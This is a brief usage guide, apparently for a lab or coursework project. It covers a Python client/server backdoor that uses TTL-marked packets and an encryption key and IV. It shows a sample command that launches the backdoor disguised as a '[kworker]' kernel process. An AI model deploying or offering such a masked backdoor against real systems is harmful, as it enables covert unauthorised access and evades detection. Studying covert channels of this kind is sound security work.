To run the program, type the following commands on separate machines...
	• client.py targetIP sourcePort dstPort ttlKey encryptionKey IV
		– targetIP is the remote device ip
		– sourcePort is the attackers device source port
		– dstPort is the remote device tcp listening port
		– ttlKey is for indentifying packet for backdoor
		– encryptionKey is use for data encryption
		– IV is use for data encryption
	• server.py dstPort ttlkey decryptionKey IV processName
		– dstPort is the remote device tcp listening port
		– ttlKey is for indentifying packet for backdoor
		– decryptionKey is use for data encryption
		– IV is use for data encryption
		– processName is the name to mask this program

from attacker: i.e - python3 client.py 10.0.0.23 500 80 71 0123456789abcdef abcdefghijklmnop

from backdoor: i.e - python3 server.py 80 71 0123456789abcdef abcdefghijklmnop [kworker/2:8505]
